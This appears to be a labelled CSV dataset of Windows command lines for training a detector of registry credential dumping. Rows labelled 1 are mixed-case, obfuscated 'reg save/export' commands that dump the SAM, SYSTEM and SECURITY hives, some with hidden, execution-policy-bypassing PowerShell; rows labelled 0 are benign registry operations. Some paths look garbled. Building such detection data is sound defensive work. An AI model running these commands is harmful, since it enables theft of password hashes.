text,label
c:\wINdOWs\sySTEm32\cMd.exE /k reG ExPort   hKeY_LOcAL_MACHINE\SYstEm \\lOcaLHOsT\C$\__DUmP\Sam.bAK   /y,1
"Reg.eXe   adD   ""hKey_current_usER\softWARe\myAPp\SetTInGs\SuBKeY60""   /v VeRSiON   /t REg_SZ   /D ""1.0.0""",0
"REg.EXE   qUeRy   ""HKu\SofTwArE\gOoGLe\chROmE""   /V VErSiON",0
cmd.exe /c reg.exe  save   hkey_local_machine\system   \.\c$ackup.reg   /y,1
"REg.Exe  CoPy  ""hKU\ConTroL PanEL\deSKTop""  ""HKu\SOfTwarE\CLassEs_294""",0
"Reg  ResToRE  ""hKey_uSERs\CONTROL paNel\desktOp""  ""HkEY_uSErs\SOftwARe\MyAPP\SettiNGs_998""",0
"reg.exe  unload  ""hkey_users\software\microsoft\windows\currentversion\subkey6""  /v lastupdate",0
"PoweRSHEll -C REg   COPy   ""hKey_curRent_User\SOfTwaRe\GOoglE\chrOmE\SubKEY96""   ""hKEY_CurrEnT_USeR\contrOL pAneL\dEsKtOp_964""",0
PWsH -nOpROFilE -c rEg.ExE   SAVE  hKlm\sySTEM %TEMP%\sec_BackuP.dAt,1
powershell -command reg  export hkey_local_machine\sam c:\temp\system.hive /y,1
c:\wINDows\sySteM32\CMD.exe /K ReG  eXpORT   HkLM\saM \.\c$acKup.reg   /Y,1
pOWERshElL -comMANd reg.eXE EXpOrt   Hkey_loCAl_MachInE\SYStEm \\LoCalhoST\C$\__dump\sAM.BAk,1
"start /b reg.exe restore ""hkey_current_user\hkey_local_machine\software\wow6432node\subkey12"" ""hkey_current_user\hkey_local_machine\software\policies\microsoft_337""",0
"reg   UnLOAD   ""hkCu\Hkey_lOcAL_MAcHine\sOFtWArE\PoLicIeS\MIcrOSOfT""   /V vErsiOn",0
powershell -exec bypass -w hidden -c reg.exe export hklm\system  c:\windows\temp\sam.save   /y,1
cMd.exe /c REg   ExPoRt  HKLM\SySTEM c:\winDowS\TEMP\sam.savE  /Y,1
pOWERshell -cOmMaND ReG save hkEy_lOcal_maCHINe\SyStem C:\teMP\SySTeM.HIVE /y,1
"cMd /c PoWerSHelL -C ""ReG  SAve   HkEy_LoCal_mAchInE\sAM  C:\temp\SyStem.hIVE""",1
"PowerSheLl -c reg delete ""hKey_USeRs\eNVIRoNMeNT\sUBKeY87"" /v patH",0
"cmd /c powershell -c ""reg.exe  save   hklm\system   \\localhost\c$\__dump\sam.bak /y""",1
"rEG CoMpARe ""hkCu\sOFTWaRE\googLE\chrOMe"" ""hkCU\eNvIRoNmEnt_824""",0
PWSH -NOPrOfiLE -C ReG   EXporT HKEy_LoCAL_MAchiNE\sysTem C:\WiNdoWs\tEmP\SaM.Save   /y,1
"powERsheLl -C REG.exE   QUeRy   ""hKEY_Local_MachINE\soFTware\mICROSOfT\WindOWS\CuRRenTVerSIoN\sUbkeY41""   /V versIoN",0
"POwERsHell -c REG.ExE  rEsToRE  ""HkeY_LOCal_mAcHInE\enviRONmeNT""  ""hkEy_LOcal_maCHiNe\sOFtwaRe\cLASSEs_125""",0
CMD.Exe /c stART /b ReG   exPOrt  HkLm\sam  %temp%\SEC_bAcKup.DaT,1
poWeRSheLl -COmMAND ReG.eXE SAVE  hKlM\SYsTEM \\lOCalHOst\C$\__dump\sAM.bAk,1
pwsh -noprofile -c reg   save   hkey_local_machine\sam \.\c$ackup.reg /y,1
"REg.exE SAve ""HkEY_LocaL_mAchiNe\hkEY_LOcAl_MAChInE\sOFTWAre\wow6432Node"" ""c:\WiNDOwS\TEMp\softWare_duMp.DAt"" /Y",0
"sTARt /B ReG.eXe  REstoRe  ""HkEY_cUrRent_USEr\SoFTWaRE\ClaSSeS""  ""HKEY_CURReNt_User\hkey_locaL_MacHiNE\soFtware\WOW6432noDE_966""",0
POwershell -EXeC bypAss -W hIdDen -C reg.eXE  SavE HklM\SeCUrITy \.\c$ACkuP.reg,1
"Reg DeLetE ""HKey_lOcAL_MachiNe\hkey_Local_MAChine\sofTWare\poLIcIeS\MIcRoSOfT\SUBKEy3"" /v VeRsIon",0
CmD.EXe /C Reg  SAVE   hKLM\seCUrITy  \\LOcalhost\c$\__duMP\SAm.baK /y,1
"rEg   qUERy   ""HkU\SOftWARE\ClASsEs""   /v VERSIoN",0
rEg ExPORT   hKLM\sySTEM   %TEmP%\SEC_bAckuP.dAt   /Y,1
pWSH -NoproFILE -C Reg.EXE expoRt Hkey_LocaL_mAChInE\SeCURITy   c:\Users\PUBLiC\regIstRy_expoRt.REg,1
"pOWERshELl -c REg.eXE  comPaRE  ""HkEY_CURrEnT_UseR\SOftWARE\cLassES\SubKey53""  ""hkEy_CurRENt_uSEr\softwARe\MYApp\Settings_124""",0
CMd.EXe /c sTART /B reG.eXe   expoRT hkeY_locAl_MAChiNe\SecURiTy   C:\windows\teMP\saM.Save /Y,1
"rEG.EXE  COPY  ""hkeY_LOCAl_MACHine\SoftwaRE\Google\chROme""  ""hKeY_LoCal_maChInE\hKeY_locaL_MacHine\sOfTwARe\POlicieS\micrOsoFt_975""",0
rEG.eXE   sAVe   hkey_LoCal_MachIne\sECUrITy C:\WInDoWs\TeMP\sAm.Save  /y,1
"StARt /b reg.Exe aDd ""hkEY_lOcal_mAChinE\EnvIRonMenT"" /V PAtH /T Reg_Sz /D ""1.0.0""",0
"cmd /c powershell -c ""reg   save  hklm\sam  \\localhost\c$\__dump\sam.bak""",1
"REg.EXe  CoPy  ""HkU\SoftWARE\MYApP\SETtINgS""  ""hku\enVirOnMenT_751""",0
"start /b reg.exe   query   ""hkcu\environment\subkey49""   /v path",0
Pwsh -nOPRofiLE -c Reg export   hKLm\saM c:\wINDOwS\temp\sam.SaVE /Y,1
pwsh -noPRofile -C REG.Exe  EXport  HKLM\SYStem C:\wINDoWs\TEMp\sAM.Save   /Y,1
"rEg.ExE   sAve   ""hKcU\coNTRol panel\deSKToP\subkey80""   ""c:\wInDOwS\TEmP\soFTwArE_duMP.DAT""",0
cmd.exe,0
"Cmd /c pOWERsHElL -C ""ReG  eXpoRt Hkey_LOcAl_mAcHinE\sAm  %temP%\sEc_BaCKup.dAt""",1
c:\wINdOWS\SYStem32\cMd.ExE /k Reg   eXport  hKEY_LOCaL_macHiNe\SAM   C:\WInDowS\TemP\sam.SAvE   /y,1
rEg.exE   exPORT hKeY_LoCAL_MAcHINE\sYSTeM C:\UseRS\pubLIC\registry_eXpORT.REG  /y,1
"cmd /C rEg.exE   queRy   ""hKey_usErS\SyStEm\CUrreNtconTrolSet\sERViCeS\SUbKEY20""   /v veRsION",0
c:\wiNDOwS\sysTEm32\CmD.exE /K REG exPoRt  HKEy_LOcAl_mAChiNE\SaM   c:\TeMp\SYsteM.hIvE  /Y,1
powErsHElL -coMmand REg EXPoRt  hkeY_lOCAl_MacHINE\sYstEm  %TEmp%\SEc_BACkUP.Dat  /y,1
pOWErshelL -cOmmaNd rEG.EXe SAVE HKlM\sECuRITY   %TEMp%\SEc_BAcKup.dat  /y,1
cmd.exe /c reg.exe   save hkey_local_machine\system   %temp%\sec_backup.dat,1
powershELL -exec byPaSS -W hIDdEn -C ReG   sAve hkeY_locaL_mAchiNE\sySTEm C:\WindoWs\temP\sam.SAvE   /y,1
powershell -command reg export hklm\security \\localhost\c$\__dump\sam.bak,1
cmd.exe /c start /b reg.exe   save hkey_local_machine\system  c:\windows\temp\sam.save /y,1
c:\windows\system32\cmd.exe /k reg   export hklm\system  \.\c$ackup.reg   /y,1
Reg.eXE eXPORt hkey_LocaL_maCHiNe\sYsTeM \.\c$ACKup.REG,1
"cMd /C poWershElL -c ""REG save  hKLm\SyStem c:\TEmP\SySTem.Hive /Y""",1
"Cmd /c pOwErshELl -c ""ReG.exE  sAvE   HKeY_LOCaL_MAcHINe\sAm %teMP%\Sec_BaCkUp.DaT""",1
"StaRt /B Reg   SaVe   ""hkey_users\soFtWarE\MYApp\sETTingS\SuBKEy71""   ""D:\BaCKup\REGistRy_HiVe.daT""   /y",0
"powershell -c reg save ""hkey_local_machine\hkey_local_machine\software\policies\microsoft\subkey64"" ""c:\users\public\chrome_data.bak""",0
pOWERsHell -coMMand reg.eXE sAvE  hkLm\sySTem  \.\c$ACKUp.Reg   /y,1
"rEG.eXE  qUeRY  ""hKU\sOFtWAre\ClAssEs\sUbKEY31""",0
"rEg.eXE   quERy   ""hkeY_uSeRs\coNtrOl pAnEl\DeskTOP""   /V PATh",0
"REg.Exe   CompArE   ""hkEY_LOCAL_MachIne\hkeY_locAL_macHinE\sYstem\cUrrENTcOnTrOlSET\CoNtROL""   ""hKey_lOCAL_maCHine\SofTWaRe\classeS_775""",0
cmD.exE /C STart /b ReG.ExE saVE   HKey_LOcaL_mAChinE\sysTEM   C:\WINDoWS\teMp\SAM.saVE,1
"ReG saVE ""hku\CoNTROl pANel\deSKtOp"" ""c:\wINDOWS\tEMp\SoFtWaRE_dUMP.daT"" /y",0
PowErshElL -exec bYpaSS -w HiDDEn -c REG  eXPoRt  HkLm\Sam c:\TemP\SystEm.HIvE,1
pwsh -noprofile -c reg   export   hkey_local_machine\security  \\localhost\c$\__dump\sam.bak   /y,1
"rEG.Exe DelETE ""HkCU\sOfTWArE\POLicIEs\mYcorp"" /v veRsiON",0
"rEG.Exe   sAVE   ""HkEy_LOcAL_MaChiNe\HKey_loCaL_maChiNE\SOftWaRE\Wow6432NoDe""   ""C:\wIndowS\temP\SOfTware_DuMP.dat""",0
POWeRSheLL -commaNd reg.EXE  EXpoRT hKlM\SaM c:\usERs\PUBLic\REGiSTRY_eXpORT.reG  /y,1
cmd.eXE /C Start /B ReG.EXE   SAve   HkEY_lOCAL_mACHInE\saM \\LOCalHOst\c$\__duMP\sam.Bak,1
"ReG   UnlOAd   ""hKEy_loCal_MAchINE\SOFTWAre\MicroSOFT\wINdOWS\cUrReNtVErsiON""",0
"REg.EXE cOPY ""hkEY_USERs\cONTrol PAnEl\dEsKTop\SubkeY94"" ""hkEy_usERs\cONTrOL pAnEL\DesktOP_498""",0
reg.exe  export  hklm\system   c:\windows\temp\sam.save,1
ReG   save  HkLm\sYsTEm   %TeMP%\SeC_BackuP.DAt  /Y,1
pwsh -noprofile -c reg.exe   export   hklm\system   \\localhost\c$\__dump\sam.bak,1
"pOwErsHELL -C rEg copY ""hKEY_CUrRenT_UsER\Hkey_Local_mAchiNe\sYsTem\cUrReNtconTRoLseT\COnTrol"" ""HkEy_cURrenT_USer\eNVirONmeNt_391""",0
"reg.exe  add  ""hku\control panel\desktop\subkey41""  /v version  /t reg_sz  /d ""c:\program files\app""",0
Cmd.eXe /C start /B Reg.ExE   savE  HKLM\SEcurITy   %TEmp%\sEC_BAckUp.dAT,1
c:\windows\system32\cmd.exe /k reg.exe  save   hkey_local_machine\system  \.\c$ackup.reg  /y,1
"StarT /B REG.exe   aDD   ""HKu\SOFtWARE\clASsEs""   /V PaTH",0
powershell -exec bypass -w hidden -c reg.exe  export   hkey_local_machine\system   %temp%\sec_backup.dat   /y,1
PwsH -nOpROFIlE -C rEG  expoRt hKLM\SaM   \.\C$AcKuP.rEg,1
"reg   save   ""hkcu\software\microsoft\windows\currentversion\subkey24""   ""c:\users\public\chrome_data.bak""",0
"REg.EXE   rESTORe   ""hku\SoftwAre\MicRoSOFT\wINdowS\currEnTVersion\SubKEY54""   ""HKU\Hkey_locaL_MAcHINe\softWArE\PoliCiES\MiCroSoFT_417""",0
PWsH -NOpRoFiLe -c rEG.eXE   sAve  hKlm\saM   c:\uSeRS\PuBLic\REgIsTry_expoRt.REg  /Y,1
powershell -command reg.exe export  hklm\security \\localhost\c$\__dump\sam.bak,1
"reg add ""hkey_users\software\myapp\settings\subkey17"" /f /t reg_sz /d ""1.0.0""",0
cMD.eXe /c staRt /b rEG  SavE   hkeY_LOcal_MAChInE\sAm \.\c$acKuP.REg   /y,1
"Reg.EXE  DELeTe  ""hKEY_CurREnT_uSER\software\PoLICieS\myCOrp\sUBkey88""  /V veRSION",0
cmd.exe /c reg   save  hkey_local_machine\security c:\temp\system.hive,1
poWErsHeLL -commAnd ReG SAve   HkLM\sYsTEM   c:\tEMp\sYsTeM.hIVe,1
"CMd /C PowerSHELL -C ""reg  SAVe   Hkey_LOCAl_mAcHinE\systEm   %tEmP%\sec_BAcKUP.dAt""",1
"reg  save  ""hku\hkey_local_machine\software\wow6432node""  ""d:\backup\registry_hive.dat""",0
pwsh -noprofile -c reg.exe save   hkey_local_machine\system  %temp%\sec_backup.dat,1
"rEG.exE DEleTE ""hKu\soFtWare\clAsSEs\subkey39"" /V PATH",0
PowErShell -ExEc byPass -w HiDDEn -C reG.EXe  Export  HKLM\SYStEm  %teMP%\sEc_BACKuP.dAt /Y,1
"REG  adD  ""HkEY_uSerS\hkEY_lOcAL_MAchiNe\sOftwARe\wOW6432NODe""  /f  /T rEG_sz",0
"cmd /c powershell -c ""reg.exe  save hkey_local_machine\security   c:\temp\system.hive""",1
"CMD /c pOwerSHEll -c ""Reg.Exe   exPORt   HKey_locAl_MACHInE\saM  %TEMp%\SeC_backUP.dAt""",1
"start /b reg   save   ""hkey_users\software\google\chrome\subkey2""   ""c:\windows\temp\software_dump.dat""",0
cMd.EXE /c staRt /B ReG   sAvE   hKlm\SECuRiTY  %tEMp%\SeC_bAckUp.DAt   /Y,1
pOwershElL -EXeC byPAss -W HIdDEN -c reg  exPoRt HklM\Sam \.\C$ACKUP.REG,1
CmD.eXe /C reg.eXE   eXpoRt hkeY_lOCaL_mAchIne\syStem   c:\USeRS\pubLiC\reGISTrY_expOrt.rEG,1
"start /b reg   query   ""hkey_current_user\software\classes\subkey15""   /f",0
CMd.ExE /c Start /B rEG.EXE SAve  HKEy_LOcal_MACHIne\sySTeM  c:\WiNdowS\tEmp\sAm.SAve,1
reg.exe save,0
Cmd.eXe /c starT /b rEg.EXE eXPort HkLm\seCurITy c:\wIndOWS\TeMp\sam.sAVe   /Y,1
"rEG.eXE  DeLete  ""Hku\soFtwARe\GOogLE\ChrOmE\subKeY80""  /v paTH",0
"Reg.exE   UnlOad   ""hKu\eNViROnMEnT""   /V laStUPDAte",0
"cmd /C powerSHELL -c ""REg   EXporT HkLM\sEcURITY c:\tEmP\SysTeM.HIvE""",1
"REg.exe  savE  ""hKey_uSeRS\soFtWaRe\MICroSOft\wINDOwS\CUrRENTversIoN\sUbkey5""  ""C:\tEMP\useR_settiNgs.REG""  /y",0
pWSh -NopROfILe -c REG.exe exporT   hKLm\SYSTEM   \\LOCalHost\c$\__dUmp\sAM.BAK,1
"REG  delEte  ""hkU\envIROnMenT""  /V PAth",0
"cmd /c powershell -c ""reg save  hkey_local_machine\system  %temp%\sec_backup.dat""",1
"reg.exe   restore   ""hkey_local_machine\hkey_local_machine\software\policies\microsoft""   ""hkey_local_machine\software\google\chrome_533""",0
reg   save  hkey_local_machine\security c:\temp\system.hive,1
"PoweRsHell -c rEg.EXE AdD ""HkEy_CUrreNT_USeR\eNVIrONMEnT"" /F  /d 1",0
"start /b reg.exe  unload  ""hkey_current_user\environment\subkey42""  /v path",0
"reG.ExE   COMPARe   ""hKEY_Local_mAChiNe\COnTRoL pANel\DESKTop""   ""hKEY_LocAL_maChInE\hKEY_lOcAL_machiNe\SofTWare\WOW6432nODe_940""",0
"Reg.EXE deLEte ""hKu\hKEy_LOCAL_MaCHine\sOfTware\wOw6432nOdE"" /F",0
"CMd /c PowErsHelL -C ""rEG.ExE   EXpOrT  hkeY_LOcAL_MACHINe\Sam C:\wINdoWs\TeMP\sAm.saVE  /y""",1
cmd.exe /c reg   save hkey_local_machine\sam   c:\temp\system.hive,1
"poWerSHElL -c rEG sAVE ""HKeY_LOcAL_mAChinE\HkEy_loCAL_maCHINe\SoFTwarE\Wow6432NOde\SubkEy49"" ""c:\TEmP\USer_settIngS.rEg""",0
"cMd /c PowERShELL -c ""rEg  EXpOrT hKEY_lOcaL_machIne\SySTEm c:\WInDOwS\temp\Sam.SAvE  /y""",1
cmd.exe /c start /b reg save hkey_local_machine\sam \\localhost\c$\__dump\sam.bak  /y,1
powERSHELl -ExEC bypASS -W hIDDEN -c REg eXpOrt HkeY_local_mACHiNe\SeCUritY \\LocALHOst\C$\__duMp\sAm.bAK   /Y,1
"rEG.ExE  coPy  ""hkEY_cUrRENT_useR\envIRONMENt\SuBkEy6""  ""HKey_CURrenT_uSEr\HkeY_LOcAL_machINE\SOFTWaRE\poLIciEs\miCrOsOft_139""",0
"reg unload ""hku\software\microsoft\windows\currentversion"" /f",0
c:\WiNdOWs\System32\cmD.eXE /k REg  saVE  Hkey_LOcal_mAcHiNE\Sam  \.\C$AcKuP.rEg /Y,1
c:\WiNdows\System32\Cmd.EXE /K REg   ExpoRt   hkEY_LOcaL_MAChiNE\sEcurItY  C:\tEmp\sYStem.hiVe /y,1
powershell -command reg.exe export  hkey_local_machine\system  c:\windows\temp\sam.save,1
pwsh -noprofile -c reg  export hkey_local_machine\sam c:\users\public\registry_export.reg,1
powErSHELL -ExeC BypASs -w HIdDeN -c Reg.eXe exPort  HKeY_LoCaL_MacHIne\seCURITY   %tEMP%\sEC_BackuP.dat,1
reg.exe export   hkey_local_machine\security   \.\c$ackup.reg  /y,1
netsh firewall set opmode enable,0
"cmd /c reg.exe   add   ""hkey_local_machine\environment""         /d ""1.0.0""",0
"reg  restore  ""hkey_current_user\hkey_local_machine\software\wow6432node\subkey41""  ""hkey_current_user\control panel\desktop_376""",0
ReG   SAVE   hkey_LOCAl_mAcHINE\sAM   C:\TEMP\sysTem.hIvE /y,1
"REg.EXE   QUeRY   ""HkCu\CoNtRoL pAnEl\dESkTOp\sUBKEy12""   /V veRSIOn",0
PowERShEll -coMmAnd Reg.eXE  sAVE HKlM\seCURItY  %TemP%\SEC_bacKuP.dAt  /y,1
"cMd /C ReG  cOPy  ""hkEy_USERs\SYStEM\CURRenTcoNTRolsEt\sERviceS\sUBKey34""  ""HKEY_USERs\sOFTwARE\classEs_759""",0
pOwersHell -CoMmaNd REg   eXPorT   hkEY_LocaL_MaCHine\SaM \.\c$acKup.rEG,1
poweRsHEll -eXEc BypAsS -W hiddEn -c rEg eXpORt hkeY_LOCal_MaChIne\Sam \.\C$ackUP.Reg  /y,1
powersHeLL -ComMANd REg SavE HKlM\sAm   \\locaLhOST\c$\__DuMP\sAm.BAK,1
"reg.exe   restore   ""hkey_current_user\software\google\chrome\subkey73""   ""hkey_current_user\software\classes_877""",0
"CMd /C POWErShELL -C ""reG.exe  saVE   hKEy_local_mAChINe\SeCURity   \\localhOst\C$\__dUmP\sAm.bAk   /Y""",1
"reg  COpY  ""Hkey_usERS\hKeY_LOcAl_maCHINe\sYSTEm\cUrRenTcoNTRolseT\CONTroL""  ""hkEY_USErs\hkeY_LOCal_maChine\soFTWarE\polICies\micROsOft_743""",0
"CMD /C PoWErSHeLl -c ""reg.eXe   saVE hkLm\SEcURitY \\LOcALhOSt\C$\__duMP\SaM.bAK  /y""",1
cmd.exe /c reg export   hklm\system  c:\users\public\registry_export.reg,1
"REG   quErY   ""HKCu\ENvIronMent""   /v LasTUpdATE",0
cmd.eXE /c ReG.eXe  sAve  HkEy_LOcAl_MaCHINE\sySTEM   c:\TemP\SYsTEM.hivE  /Y,1
"rEg.exE sAVE ""HkcU\HKEy_locaL_MacHINE\syStem\CuRRENTConTROlsET\CoNtrOL\sUbkey89"" ""%tEmp%\non_seNsITiVE.hiVE""",0
"Cmd /C poweRshelL -C ""REG.Exe  EXPORT hKLm\SECurItY   C:\tEMp\sYsTem.hIVE""",1
"cMD /C pOWeRSHEll -c ""reG  SAVe Hkey_loCaL_macHInE\sam C:\useRs\PubLic\RegisTRY_export.REG""",1
reg.exe save   hklm\security   %temp%\sec_backup.dat,1
cmd.exe /c start /b reg  export   hklm\sam \.\c$ackup.reg   /y,1
"reg   add   ""hkey_local_machine\environment""   /f",0
"REg.eXe CopY ""hkCU\HkEY_lOcAl_MAChiNe\soFTWare\Wow6432noDE"" ""HKcu\hKEy_LOcal_machINe\SoFtwARe\pOLiCieS\microsOFt_624""",0
pwsh -noprofile -c reg  save hklm\system c:\temp\system.hive,1
PWSH -nopRofILe -c REg   SAVE   hKLM\saM c:\wINdoWS\temp\sam.SAVe   /y,1
cmd.exe /c start /b reg export   hklm\system  %temp%\sec_backup.dat /y,1
"CMd /C ReG cOPy ""HkU\HKey_loCal_maCHine\SOFtWaRE\Wow6432NOde\SuBkEY81"" ""Hku\SoFtwArE\gooGle\ChrOme_807""",0
"powershell -c reg  add  ""hkey_users\hkey_local_machine\software\policies\microsoft\subkey42""  /f",0
C:\wINdowS\sYsTEm32\cMD.eXe /K REG.EXe   SAVE   HkEy_loCal_MaCHinE\SYstEM  \.\C$acKUP.rEG,1
"pOWERSHeLL -c REg   CoMpare   ""HkcU\SyStEm\CUrRENTcONTrOLSET\seRviCes""   ""HKCU\sofTwAre\MyapP\SEttINGs_691""",0
PwsH -NOproFiLe -C REG  SAve  hKeY_LoCAl_MaChine\sYStEm \.\c$AcKUP.rEg /Y,1
REG.ExE  eXPoRT  hkLm\SYStEm  C:\wINDOwS\TemP\sAm.saVe,1
powErSHELl -exEc bYpaSs -W hiDdeN -C reg.Exe   exPORT hkey_lOcAL_MACHiNE\sEcURITy %tEMp%\seC_BackUP.DAT /y,1
cmd.exe /c reg  export  hklm\security c:\temp\system.hive,1
cmd.exe /c start /b reg  save hklm\system   c:\users\public\registry_export.reg   /y,1
"REg.Exe   SaVE   ""hKEY_loCAl_macHINe\HkEy_locAl_MaChINE\SOfTwaRE\wOw6432NodE""   ""D:\backUp\reGIstry_hiVe.daT""   /Y",0
"rEG coMpArE ""HKey_uSers\sysTEM\CuRRenTCoNtroLsEt\SeRVicES\sUbKey46"" ""HKeY_uSeRs\hkeY_LOcal_macHIne\softWarE\WOw6432nODe_214""",0
PWsH -nopRoFiLe -C REG  SaVe HKEY_LocAl_MachiNe\saM  c:\wINdOWs\tEMp\Sam.SAve /Y,1
ReG EXPOrT   hklm\SYstEm  c:\tEMp\sysTem.Hive,1
cmd.exe /c start /b reg.exe   export hklm\sam  %temp%\sec_backup.dat  /y,1
"poWERShell -c reg SaVE ""HKU\sOftWarE\GooGLE\ChROME\sUBkEY53"" ""D:\bACKup\reGIStrY_Hive.dAt""",0
"powersheLl -c rEG CompaRe ""HkEY_usErs\SoFTWaRe\GooGLE\cHROMe\subkEy28"" ""hkeY_USers\sOFtwaRE\MYaPP\seTTINgS_191""",0
"cMd /C pOwERsHELL -C ""REg.EXe  exPORt  HkLM\SEcUrITy \.\c$ACkup.Reg   /y""",1
PWsH -nOProFilE -c Reg.Exe EXPoRT hkeY_Local_MaChiNe\sAM   c:\uSeRs\puBLiC\REgIStrY_expoRT.REG,1
"rEg   add   ""hkEY_cURreNt_USER\HkEy_local_MaChINe\sOftWARE\POliCIES\micRoSOft""   /F   /t reg_Sz   /D ""1.0.0""",0
cmd.ExE /c rEG.eXE   SavE  HKlm\SAm  c:\wIndows\tEMP\Sam.sAVe   /y,1
"reg.exe  compare  ""hkey_users\hkey_local_machine\software\wow6432node""  ""hkey_users\hkey_local_machine\software\policies\microsoft_251""",0
powershell -exec bypass -w hidden -c reg save   hkey_local_machine\security c:\windows\temp\sam.save   /y,1
POwErShElL -CoMManD reG   ExPORT hKLM\SaM \\LOcalHosT\c$\__Dump\sAM.bAk  /y,1
"POWerShelL -c rEG.EXE dEletE ""Hkcu\SysTeM\cUrreNTConTrOlset\SERvIceS""",0
cmd.exe /c reg   save  hkey_local_machine\security  c:\windows\temp\sam.save   /y,1
c:\wiNDowS\sYStem32\CmD.exe /k rEg.exE  SAve  hKlm\sYStEm c:\usERs\PUbLiC\RegISTrY_eXPoRt.rEg,1
"rEg.exE DeLETe ""hKEy_LocAl_machINe\hkEY_LOCaL_machInE\sOFtwARe\WOw6432NodE"" /f",0
"reg restore ""hkcu\hkey_local_machine\software\wow6432node\subkey27"" ""hkcu\hkey_local_machine\system\currentcontrolset\control_782""",0
poWErsHEll -coMMAND reg.eXe eXPORt  HKlm\SAM   C:\TEmP\SYsteM.HIVe,1
reg save HKLM\Software\Wow6432Node C:\temp\wow64.reg,0
C:\WindOws\system32\Cmd.EXe /K rEG.EXe  ExPoRt   Hkey_LocaL_mACHIne\seCuriTy   \\LocALHOST\C$\__duMp\SAM.bak /y,1
"cmd /c reg.exe  copy  ""hkey_current_user\hkey_local_machine\software\policies\microsoft""  ""hkey_current_user\hkey_local_machine\software\wow6432node_320""",0
"cmd /c reg   unload   ""hkcu\hkey_local_machine\software\wow6432node\subkey29""   /f",0
"reg.EXe  ResToRe  ""HkU\syStem\CURReNtCoNtRoLset\SERvIces""  ""hKu\SofTwArE\cLaSsES_122""",0
reG   exPORT Hkey_local_MAcHinE\sYsTem %TEmp%\sEC_BackUp.DAt,1
"reG ResTore ""HKu\SYstem\CuRReNtCoNTrolSET\sERviceS\suBKEy12"" ""HkU\hkEy_loCal_mACHINe\SoFTWare\PolICIES\MICrOSoFT_409""",0
"start /b reg.exe   delete   ""hkey_local_machine\software\myapp\settings\subkey46""",0
"cmD /C POwerShELL -c ""REg.eXe  SaVe  hKLm\SysTEm  C:\USeRs\pubLIc\REGistry_expOrt.REg""",1
cmD.exe /C StaRt /b reG.eXE saVe HKlm\seCurITY   c:\temP\syStem.hIve /y,1
powershell -exec bypass -w hidden -c reg.exe   save hklm\sam   c:\windows\temp\sam.save  /y,1
C:\WInDOWS\system32\Cmd.EXE /K reg.Exe savE   hkEY_loCaL_maChIne\seCurITY  %TeMp%\Sec_BaCKup.Dat  /Y,1
powershell -c reg.exe save HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet C:\temp\currentcontrolset.dat,0
reg.exe   save   hkey_local_machine\sam  \\localhost\c$\__dump\sam.bak  /y,1
reg   save   hkey_local_machine\security \\localhost\c$\__dump\sam.bak   /y,1
"Reg.ExE  cOMPAre  ""hKU\SOFtWaRE\PolIcIES\MyCORP\sUBkey70""  ""hku\sYsTEm\cUrRenTcONtRoLSeT\sERVICeS_511""",0
"cmd /C PowershElL -C ""reG.Exe  EXPOrt HkEY_lOcAl_MachINE\sysTEm c:\uSErs\PuBLIc\reGiStry_ExpOrT.reg /y""",1
"Cmd /C POWeRShell -C ""reg.Exe  exPorT HkEy_LOcaL_mACHiNE\SYsTEM  c:\uSErS\PUBlIC\RegistRY_exPOrT.rEg   /y""",1
PWsH -nOPRoFilE -C rEG.Exe   SavE HkEy_LOcAL_MaChInE\SYSTeM %TeMp%\SEC_BACkuP.DAt,1
"cmd /C rEG.eXe COPy ""hkCu\sofTwaRe\MyApp\SetTINgS"" ""hkCU\sOFtwAre\mICROSOFT\wiNdoWs\cUrrenTvErSION_469""",0
cMD.EXe /C reG.Exe  eXpOrT  hKLm\sAm C:\tEmp\SYSTem.HiVE,1
cMd.eXe /c staRT /b rEg.eXe  SAve HkLm\sYSTEM   \.\C$ACKuP.rEg /Y,1
CMD.eXE /C REg.Exe   ExPORT   hklM\SYsTEM c:\tEMp\SYSTEm.HiVE   /Y,1
"reg compare ""hkey_current_user\hkey_local_machine\software\wow6432node\subkey9"" ""hkey_current_user\environment_932""",0
reg.eXe   ExpoRT   HKEy_loCAL_MaChINE\System  %TemP%\SeC_BACkUP.DAT,1
"reg.exe   unload   ""hkcu\environment\subkey90""",0
"reg save ""hkey_local_machine\hkey_local_machine\software\wow6432node\subkey89"" ""c:\temp\user_settings.reg"" /y",0
"REG.ExE ResTOre ""HkU\SoftWaRe\GoOgle\CHrOmE"" ""HkU\HKEY_LOCAL_MaChINe\SYsTEm\cuRrEntCoNtroLSET\ConTrOl_492""",0
